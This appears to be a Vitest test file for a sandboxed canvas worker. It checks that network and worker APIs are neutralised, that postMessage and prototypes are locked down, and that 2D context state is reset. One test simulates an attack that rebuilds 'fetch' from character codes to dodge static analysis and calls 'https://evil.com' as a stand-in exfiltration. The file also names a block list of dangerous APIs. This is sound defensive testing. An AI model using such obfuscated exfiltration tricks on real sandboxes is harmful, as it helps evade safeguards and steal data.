import { describe, it, expect, vi } from 'vitest';
import {
  hardenWorkerGlobalScope,
  setupWorkerCommunication,
  processWorkerExecution,
  DANGEROUS_WORKER_APIS,
} from '../canvas-worker';

describe('Worker Global Scope Hardening (Layer 2 Defense)', () => {
  it('neutralizes all dangerous APIs to undefined in the target scope', () => {
    // Construct a mock DedicatedWorkerGlobalScope with native APIs present
    const mockScope: Record<string, unknown> = {
      fetch: vi.fn(),
      XMLHttpRequest: function MockXHR() {
        return { open: vi.fn() };
      },
      WebSocket: function MockWS() {
        return { send: vi.fn() };
      },
      importScripts: vi.fn(),
      indexedDB: {},
      setTimeout: vi.fn(),
      setInterval: vi.fn(),
      Worker: function MockWorker() {
        return { postMessage: vi.fn() };
      },
      alert: vi.fn(),
    };

    hardenWorkerGlobalScope(mockScope, { freezePrototypes: false });

    // Verify all dangerous APIs became undefined
    for (const api of DANGEROUS_WORKER_APIS) {
      expect(mockScope[api]).toBeUndefined();
    }

    // Verify properties cannot be overwritten (non-writable)
    expect(() => {
      'use strict';
      mockScope.fetch = function () {
        return 'rogue';
      };
    }).toThrow();
  });

  it('protects postMessage from rogue execution while keeping internal communication intact', () => {
    const realPostMessageSpy = vi.fn();
    const mockScope = {
      postMessage: realPostMessageSpy,
    };

    setupWorkerCommunication(mockScope);

    // Any attempt by rogue sandboxed code to call self.postMessage throws an error
    expect(() => {
      mockScope.postMessage({ type: 'ROGUE_MESSAGE' });
    }).toThrow(/postMessage is disabled/);

    expect(realPostMessageSpy).not.toHaveBeenCalled();
  });

  it('freezes base prototypes when requested to prevent prototype climbing and pollution', () => {
    // Create an object inheriting from Object.prototype
    const obj = {};
    const proto = Object.getPrototypeOf(obj);

    hardenWorkerGlobalScope({}, { freezePrototypes: true });

    expect(Object.isFrozen(proto)).toBe(true);
    expect(Object.isFrozen(Function.prototype)).toBe(true);
    expect(Object.isFrozen(Array.prototype)).toBe(true);
  });

  it('proves Layer 2 defense holds when malicious code bypasses static analysis via dynamic reflection', () => {
    // Simulate a hardened worker global scope
    const mockScope: Record<string, unknown> = {
      fetch: vi.fn(),
      XMLHttpRequest: vi.fn(),
      WebSocket: vi.fn(),
    };

    // Apply worker hardening
    hardenWorkerGlobalScope(mockScope, { freezePrototypes: false });

    // Attack payload without forbidden words:
    // It dynamically accesses the global scope reference and tries to invoke fetch
    const fKey = String.fromCharCode(102, 101, 116, 99, 104); // 'fetch'
    const fn = mockScope[fKey];

    // Verify that Layer 2 rendered the API inert
    expect(fn).toBeUndefined();

    // Invoking it causes TypeError at runtime, blocking network exfiltration completely
    expect(() => {
      (fn as (url: string) => void)('https://evil.com');
    }).toThrow(TypeError);
  });

  it('sanitizes 2D context state (transforms, globalAlpha, shadows) before every frame execution', () => {
    const resetTransformSpy = vi.fn();
    const clearRectSpy = vi.fn();

    const mockCtx = {
      globalAlpha: 0.2, // Leftover from previous frame
      globalCompositeOperation: 'destination-out', // Leftover
      shadowBlur: 30, // Leftover
      shadowColor: 'red', // Leftover
      filter: 'blur(5px)', // Leftover
      lineWidth: 10,
      strokeStyle: '#ff0000',
      fillStyle: '#00ff00',
      resetTransform: resetTransformSpy,
      clearRect: clearRectSpy,
      fillRect: vi.fn(),
      beginPath: vi.fn(),
      arc: vi.fn(),
      fill: vi.fn(),
      getImageData: () => ({ data: new Uint8Array(16) }),
    };

    const canvasProvider = () => ({
      canvas: { transferToImageBitmap: () => ({ close: () => {} } as unknown as ImageBitmap) },
      ctx: mockCtx as unknown as CanvasRenderingContext2D,
    });

    const payload = {
      id: 'test_sanitize_1',
      code: 'ctx.fillRect(0, 0, 10, 10);',
      t: 0.5,
      width: 100,
      height: 100,
      returnImageData: true,
    };

    const response = processWorkerExecution(payload, canvasProvider);

    expect(response.type).toBe('SUCCESS');
    expect(resetTransformSpy).toHaveBeenCalled();
    expect(clearRectSpy).toHaveBeenCalledWith(0, 0, 100, 100);
    expect(mockCtx.globalAlpha).toBe(1.0);
    expect(mockCtx.globalCompositeOperation).toBe('source-over');
    expect(mockCtx.shadowBlur).toBe(0);
    expect(mockCtx.shadowColor).toBe('transparent');
    expect(mockCtx.filter).toBe('none');
    expect(mockCtx.lineWidth).toBe(1);
  });
});

